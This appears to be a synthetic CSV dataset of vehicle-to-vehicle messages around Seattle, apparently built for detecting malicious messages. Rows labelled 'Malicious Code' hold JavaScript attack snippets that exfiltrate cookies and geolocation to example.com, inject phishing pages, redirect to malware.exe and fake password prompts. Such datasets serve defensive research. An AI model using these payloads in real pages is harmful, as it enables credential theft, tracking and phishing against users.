Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
32:40.3,vehicle_43,car,47.60935953,-122.3971268,115.4072999,Safety,Be aware of Road closures.,snowy
16:27.8,vehicle_97,car,47.67134128,-122.3211319,38.66235294,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
13:13.2,vehicle_3,car,47.62125795,-122.392077,40.17237658,Traffic Update,Gridlock on Drive.,snowy
42:06.2,vehicle_26,motorcycle,47.63953412,-122.3065095,63.00369196,Emergency Update,Chemical spill in your part of town.,rainy
10:24.4,vehicle_17,motorcycle,47.65750057,-122.3710923,79.76744232,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
00:13.3,vehicle_75,car,47.66382298,-122.3773625,89.48614137,Traffic Update,Traffic jam on Bundesautobahn 1.,snowy
34:26.2,vehicle_11,truck,47.6065715,-122.3858993,19.5415405,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
07:59.1,vehicle_55,motorcycle,47.66015051,-122.3926977,112.4118772,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
53:42.9,vehicle_8,motorcycle,47.63572272,-122.3488819,39.71348157,Emergency Update,Civil unrest in your neighborhood.,snowy
11:54.6,vehicle_18,truck,47.62935663,-122.362459,32.50972339,Traffic Update,At-a-standstill traffic on County Road 1.,snowy
10:33.4,vehicle_59,car,47.68254456,-122.349602,66.87957161,Traffic Update,Stop-and-go traffic on Lane.,clear
04:07.1,vehicle_15,truck,47.63361815,-122.3405906,6.293877454,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
04:55.2,vehicle_83,car,47.66842179,-122.3184514,91.67034303,Safety,Be alert to Road closures.,foggy
53:55.7,vehicle_60,truck,47.65940256,-122.3943589,59.18988108,Traffic Update,Gridlock on M25.,clear
34:23.6,vehicle_31,motorcycle,47.63889579,-122.3033894,99.92600813,Emergency Update,Road collapse in your community.,snowy
00:58.5,vehicle_65,motorcycle,47.60528371,-122.3770783,44.58242954,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
47:48.4,vehicle_67,motorcycle,47.60052289,-122.3664846,12.2827167,Emergency Update,Bridge collapse in your region.,rainy
54:50.6,vehicle_44,car,47.61105348,-122.302336,83.0044506,Traffic Update,Heavy congestion on County Road 1.,snowy
45:01.3,vehicle_23,motorcycle,47.60825402,-122.3268928,83.34459142,Safety,Be on the lookout for Inclement weather.,rainy
46:04.9,vehicle_65,car,47.68372408,-122.3226344,114.7170491,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
55:03.2,vehicle_47,motorcycle,47.60796877,-122.3882156,103.6293703,Traffic Update,Traffic is at a standstill on the northbound lanes of National Highway 1.,rainy
26:01.0,vehicle_7,truck,47.61932273,-122.3287898,57.34398003,Emergency Update,Emergency traffic in your neighborhood.,rainy
32:04.5,vehicle_78,truck,47.6508558,-122.3772252,63.82142242,Safety,Be cautious of Detours.,snowy
20:28.0,vehicle_33,car,47.67321233,-122.3105108,13.75484593,Traffic Update,Traffic is at a standstill on the northbound lanes of Avenue.,snowy
30:11.7,vehicle_22,truck,47.66180028,-122.3337332,115.9976093,Safety,Avoid Low visibility due to fog or smoke.,rainy
55:04.5,vehicle_25,motorcycle,47.64367416,-122.3832121,114.2061403,Emergency Update,Major traffic collision in your locale.,clear
24:08.2,vehicle_52,car,47.68169407,-122.3579004,59.4106187,Safety,Watch out for Detours.,rainy
45:49.8,vehicle_53,car,47.60694064,-122.3436384,60.96520738,Safety,Watch out for Accidents.,snowy
42:04.6,vehicle_10,truck,47.63954241,-122.3355885,112.4530355,Traffic Update,Tailback on Route 66.,rainy
44:25.9,vehicle_39,truck,47.60210587,-122.3544036,103.5577817,Traffic Update,Traffic backup on Avenue.,foggy
13:31.0,vehicle_16,motorcycle,47.620528,-122.3494475,111.1578319,Traffic Update,Heavy traffic on Drive.,foggy
23:51.9,vehicle_32,motorcycle,47.67424932,-122.39918,34.54930411,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
25:59.9,vehicle_56,truck,47.65267171,-122.3813128,45.42645468,Safety,Exercise caution regarding Accidents.,clear
47:43.9,vehicle_95,motorcycle,47.67583505,-122.3486827,77.01842812,Traffic Update,Heavy traffic on Lane.,foggy
42:18.3,vehicle_69,motorcycle,47.66325597,-122.383412,65.89814436,Traffic Update,Heavy congestion on Boulevard.,clear
14:06.8,vehicle_34,motorcycle,47.63076832,-122.3258522,73.08685951,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
26:26.8,vehicle_28,motorcycle,47.62118094,-122.3018216,26.65374424,Emergency Update,Power outage in your immediate area.,snowy
58:41.4,vehicle_27,motorcycle,47.64122429,-122.3248094,100.7286984,Traffic Update,Traffic backup on Highway 1.,foggy
56:15.3,vehicle_6,car,47.64910372,-122.3626494,73.69023943,Safety,Avoid Wildlife crossing.,rainy
12:46.9,vehicle_52,truck,47.68328951,-122.3132229,16.62287275,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
05:15.7,vehicle_92,car,47.64591967,-122.3620358,112.3609105,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
15:57.4,vehicle_28,truck,47.60864888,-122.3820024,94.56040925,Emergency Update,Bridge collapse in your jurisdiction.,clear
25:39.5,vehicle_41,motorcycle,47.61389078,-122.3586908,83.5425877,Safety,Watch out for Road construction.,rainy
14:39.8,vehicle_85,car,47.62999341,-122.3643005,111.7360849,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
21:13.9,vehicle_80,car,47.66974516,-122.3658648,67.31705787,Traffic Update,Gridlock on County Road 1.,snowy
14:30.3,vehicle_12,truck,47.6105654,-122.3571017,107.4687713,Emergency Update,Major traffic collision in your locale.,clear
40:25.2,vehicle_86,truck,47.6715113,-122.3381916,85.74927792,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
25:51.8,vehicle_70,truck,47.60238241,-122.3675085,84.56978175,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
06:16.5,vehicle_94,car,47.61660683,-122.3384912,82.98274232,Emergency Update,Multi-vehicle accident in your locality.,rainy
53:07.1,vehicle_36,truck,47.62074454,-122.3089092,69.44716602,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
01:49.3,vehicle_98,car,47.66896563,-122.3694514,73.76644741,Safety,Exercise caution regarding Fallen trees.,clear
03:05.9,vehicle_2,car,47.61527926,-122.3202858,27.33143406,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
18:13.8,vehicle_24,truck,47.64880815,-122.3595833,63.88276743,Emergency Update,Terrorist attack in your locale.,foggy
43:30.6,vehicle_66,motorcycle,47.64209181,-122.3806813,86.32826283,Emergency Update,Evacuation order in your immediate area.,clear
02:08.3,vehicle_26,motorcycle,47.66006131,-122.3444853,84.84117719,Emergency Update,Active shooter nearby.,rainy
39:26.1,vehicle_90,truck,47.65093927,-122.3694229,117.5194111,Emergency Update,Terrorist attack in your surrounding area.,clear
10:19.1,vehicle_54,car,47.61834385,-122.3564787,112.2232809,Safety,Watch out for Construction zones.,snowy
59:12.5,vehicle_96,truck,47.68026637,-122.3285097,110.9194269,Traffic Update,Severe traffic congestion on Avenue.,foggy
39:35.4,vehicle_33,truck,47.62036619,-122.3862675,20.11656336,Emergency Update,Terrorist attack in your region.,snowy
46:07.4,vehicle_53,truck,47.66176162,-122.3985938,9.743194038,Traffic Update,Traffic bottleneck on Drive.,snowy
54:53.1,vehicle_30,car,47.60342793,-122.3504447,96.77390179,Safety,Take precautions against Wildlife crossing.,snowy
11:11.3,vehicle_35,motorcycle,47.63233447,-122.3228084,108.703879,Traffic Update,Tailback on Highway 1.,clear
26:19.9,vehicle_98,car,47.66673074,-122.3304351,96.16789924,Safety,Take precautions against Detours.,rainy
59:44.9,vehicle_87,motorcycle,47.64424527,-122.303521,66.13701852,Emergency Update,Bridge collapse in your locality.,clear
19:38.0,vehicle_8,car,47.66611249,-122.3104839,71.61843428,Emergency Update,Evacuation order in your locality.,foggy
11:10.8,vehicle_82,motorcycle,47.64130499,-122.3145103,84.70227522,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
00:38.7,vehicle_71,truck,47.63541816,-122.3927595,41.09315754,Traffic Update,Heavy congestion on Lane.,clear
06:04.5,vehicle_86,car,47.64103757,-122.3282145,8.693499861,Traffic Update,Tailback on Interstate 40.,snowy
25:40.8,vehicle_16,motorcycle,47.62663752,-122.3361304,19.6371688,Traffic Update,Traffic backup on Drive.,clear
20:50.6,vehicle_76,motorcycle,47.61401019,-122.3005465,67.52544464,Emergency Update,Traffic diversion in your community.,clear
03:34.0,vehicle_96,truck,47.62770326,-122.3759838,110.0324798,Safety,Be aware of Wildlife crossing.,foggy
38:36.6,vehicle_3,car,47.62373974,-122.3111576,102.9974336,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
11:30.8,vehicle_59,truck,47.6283029,-122.3872177,85.19517792,Emergency Update,Terrorist attack in your community.,foggy
01:53.9,vehicle_24,car,47.61920849,-122.38419,4.054584155,Traffic Update,Heavy traffic on Drive.,clear
41:25.2,vehicle_54,motorcycle,47.69304747,-122.3448783,115.0510311,Emergency Update,Natural disaster in your vicinity.,clear
41:29.7,vehicle_80,motorcycle,47.63651712,-122.3393202,112.4113801,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
25:57.4,vehicle_37,motorcycle,47.62522961,-122.3875748,65.15268876,Traffic Update,Traffic jam on Local Street.,snowy
22:18.9,vehicle_20,motorcycle,47.65118892,-122.3523779,79.71193295,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
47:42.0,vehicle_61,truck,47.69109417,-122.3394133,13.45924796,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,foggy
05:42.8,vehicle_40,motorcycle,47.64802844,-122.3285668,118.2981805,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
46:50.8,vehicle_37,motorcycle,47.6260138,-122.3372141,88.96274337,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
36:57.5,vehicle_78,motorcycle,47.64892088,-122.3264976,102.7081395,Emergency Update,Head-on collision in your locality.,snowy
58:56.2,vehicle_64,truck,47.6806513,-122.3553723,52.93189422,Traffic Update,Slow traffic on City Road 1.,snowy
20:53.9,vehicle_68,motorcycle,47.69118963,-122.3286243,24.54058838,Emergency Update,Head-on collision in your vicinity.,foggy
56:19.5,vehicle_68,truck,47.60202073,-122.3244246,45.39178094,Traffic Update,Gridlock on A1.,snowy
34:54.9,vehicle_71,motorcycle,47.62093398,-122.3504472,23.40887003,Traffic Update,Traffic jam on State Highway 1.,rainy
37:14.8,vehicle_71,truck,47.62050862,-122.3217541,54.61027893,Traffic Update,Tailback on Drive.,rainy
19:31.4,vehicle_65,motorcycle,47.66847867,-122.3662025,56.41968891,Emergency Update,Water crisis in your immediate area.,rainy
21:36.5,vehicle_27,motorcycle,47.66966552,-122.3088925,102.1614991,Emergency Update,Bridge collapse in your region.,foggy
05:18.8,vehicle_8,truck,47.66656751,-122.3731164,99.70772152,Traffic Update,Heavy traffic on Drive.,clear
11:27.2,vehicle_64,car,47.68138222,-122.3341013,63.21649578,Safety,Stay away from Road closures.,snowy
13:40.5,vehicle_96,car,47.61580984,-122.3860144,33.34294307,Traffic Update,Traffic jam on Interstate 40.,snowy
42:30.3,vehicle_53,truck,47.6198675,-122.3131843,107.3836806,Emergency Update,Water crisis in your community.,foggy
18:08.2,vehicle_33,truck,47.62081662,-122.3198661,111.6510594,Safety,Exercise caution regarding Icy roads.,snowy
51:05.4,vehicle_22,motorcycle,47.61988177,-122.365858,51.64758307,Emergency Update,Head-on collision in your part of town.,clear
56:57.8,vehicle_37,motorcycle,47.65758671,-122.3697483,111.539967,Emergency Update,Traffic diversion in your jurisdiction.,foggy
35:57.5,vehicle_14,car,47.61530939,-122.3526044,92.01906274,Emergency Update,Chemical spill nearby.,foggy
28:47.0,vehicle_72,motorcycle,47.6809438,-122.3964212,71.31870863,Emergency Update,Chemical spill in your neighborhood.,foggy
27:06.6,vehicle_17,motorcycle,47.64891796,-122.329614,56.48562079,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
32:32.6,vehicle_77,truck,47.68260257,-122.3318952,32.97654571,Safety,Be cautious of Fallen trees.,rainy
56:31.0,vehicle_26,truck,47.60114611,-122.3361593,64.45850697,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
08:18.3,vehicle_87,car,47.65280422,-122.3808386,119.6899584,Traffic Update,At-a-standstill traffic on Boulevard.,snowy
50:49.3,vehicle_5,truck,47.69799235,-122.3042119,26.61529361,Safety,Stay informed about Icy roads.,snowy
39:57.2,vehicle_83,motorcycle,47.60130036,-122.3591231,93.06295472,Safety,Beware of Power outages.,rainy
19:30.7,vehicle_35,truck,47.69016395,-122.3893385,31.28614999,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
38:36.7,vehicle_50,motorcycle,47.62767315,-122.3750007,4.622488989,Emergency Update,Hazardous materials incident in your community.,snowy
33:32.8,vehicle_30,car,47.67006266,-122.3026721,10.06896441,Traffic Update,Heavy congestion on I-95.,clear
39:05.3,vehicle_97,motorcycle,47.61147879,-122.3002929,17.06978048,Traffic Update,Traffic backup on Provincial Highway 1.,snowy
09:56.2,vehicle_56,motorcycle,47.69466983,-122.3951578,54.53078837,Traffic Update,Traffic jam on Boulevard.,snowy
23:58.9,vehicle_21,motorcycle,47.68263068,-122.3924981,58.25389292,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
43:02.3,vehicle_10,truck,47.65429472,-122.3852109,93.64510277,Traffic Update,Stop-and-go traffic on A1.,clear
04:21.7,vehicle_36,car,47.69783038,-122.3320162,42.00935334,Safety,Exercise caution regarding Road closures.,clear
42:46.8,vehicle_81,truck,47.66400801,-122.3385084,106.0986787,Safety,Stay informed about Road closures.,rainy
54:32.4,vehicle_32,car,47.64288034,-122.3597049,72.103439,Safety,Be alert to Detours.,foggy
52:23.0,vehicle_84,car,47.68442869,-122.349464,42.61402369,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,rainy
53:08.6,vehicle_13,motorcycle,47.60232069,-122.3749474,109.8346375,Safety,Stay informed about Construction zones.,foggy
21:51.5,vehicle_2,truck,47.68739697,-122.3826134,100.8762534,Safety,Look out for Uneven surfaces.,foggy
50:19.1,vehicle_48,car,47.64103356,-122.3794148,62.75163697,Emergency Update,Infrastructure collapse nearby.,clear
07:08.6,vehicle_51,motorcycle,47.62966761,-122.3441601,28.5455614,Emergency Update,Civil unrest in your locality.,clear
27:40.0,vehicle_60,truck,47.6499241,-122.3965542,33.5847072,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
27:55.4,vehicle_73,car,47.60821567,-122.3401545,91.10171471,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
38:43.8,vehicle_80,truck,47.67584689,-122.3277316,72.14387188,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
23:39.3,vehicle_80,motorcycle,47.65346834,-122.3717189,47.09564235,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
26:20.4,vehicle_84,car,47.67686547,-122.3401997,6.840656918,Emergency Update,Major traffic collision in your part of town.,rainy
58:50.7,vehicle_40,truck,47.64421267,-122.3134273,44.64481939,Emergency Update,Active shooter in your jurisdiction.,rainy
46:49.4,vehicle_62,car,47.69895262,-122.3365749,30.4027114,Traffic Update,At-a-standstill traffic on Interstate 40.,foggy
23:24.4,vehicle_90,truck,47.61370973,-122.3752168,103.6207231,Safety,Look out for Road construction.,snowy
07:06.9,vehicle_71,motorcycle,47.67741907,-122.3063123,69.50199115,Safety,Be aware of Road closures.,foggy
